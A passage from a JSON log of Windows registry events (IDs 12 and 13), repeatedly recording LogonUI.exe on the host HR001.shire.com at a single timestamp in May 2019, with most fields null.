\"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"13\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"13\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"13\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, 